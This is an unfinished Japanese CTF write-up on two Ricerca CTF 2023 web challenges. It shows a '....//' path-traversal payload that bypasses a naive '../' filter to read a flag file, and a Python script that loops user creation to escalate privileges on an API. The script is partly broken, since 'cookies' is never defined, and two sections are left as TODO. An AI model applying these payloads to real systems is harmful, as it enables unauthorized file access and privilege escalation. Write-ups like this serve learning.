---
title: "Ricerca CTF writeup - Web初心者の備忘録"
emoji: "❓"
type: "tech" # tech: 技術記事 / idea: アイデア
topics: ["CTF", "Web"]
published: false
---

## はじめに
Ricerca CTF 2023お疲れさまでした。
運営の皆様、参加者の皆様、ありがとうございました。

さて、自分はWeb初心者、CTFほとんど初参加という形でしたが、Web問を二個解けたため、その備忘録と考察を書いていきます。

## 解いたもの

 - Cat Cafe
   - 簡単なFLI問題
 - tinyDB
   - 連想配列で作られたDBの問題

## それぞれの解説

### Cat Cafe

この問題のバックエンドはflaskです。
この問題では、まず以下のようなページが表示されます。

![](/images/cat.png)

ここで猫の画像を右クリックで開くと、以下のようなURLに飛びます。
```url
http://cat-cafe.2023.ricercactf.com:8000/img?f=01.jpg
```

ここで問題のソースコードを読むと、ユーザのクエリを
```py
filename = flask.request.args.get("f", "").replace("../", "")
```
という形で受け付けているのがわかります。
`../`が置換されるため、`....//`というクエリを投げれば`../`に置換されます。

したがって、
```url
http://cat-cafe.2023.ricercactf.com:8000/img?f=....//flag.txt
```

というリクエストを投げると、flagが表示されます。

### tinyDB

この問題のバックエンドはfastifyです。
この問題では、まず以下のようなページが表示されます。

![](/images/tiny.png)

バックエンドはAPIで用意されているため、APIを抜き出すと以下の通りです。

```url
http://tinydb.2023.ricercactf.com:8888/set_user
http://tinydb.2023.ricercactf.com:8888/get_flag
```

それぞれのAPIについて、以下のような挙動を確認しました。

#### set_user

リクエスト
```json
{
    "username": "admin",
    "password": "dummy"
}
```
レスポンス
```
{
    "authId": "admin",
    "authPW": "dummy",
    "grade": "guest"
}
```

#### get_flag

リクエスト
```json
{
    "username": "admin",
    "password": "dummy"
}
```
レスポンス
```
{"flag":"no flag for you :)"}
```



このうち、set_userではユーザの作成、get_flagではユーザの権限テストを主に行っていると推測しました。

ここで問題のソースコードを確認します。
(TODO: 追記)

ここで、作成したエクスプロイトコードを先に掲載します。

```py
import requests
import random 

session = requests.session()

for i in range(10):
    json_data = {
        'username': "admin",
        'password': "dummy",
    }

    res = session.post("http://tinydb.2023.ricercactf.com:8888/set_user", json=json_data, cookies=cookies)
    print(res.text)
    print(res.cookies)
    
    
json_data = {
    'username': 'admin',
    'password': "********************************",
}
res = session.post("http://tinydb.2023.ricercactf.com:8888/get_flag", json=json_data, cookies=cookies)
print(res.text)
print(res.cookies)
```


(TODO: 追記)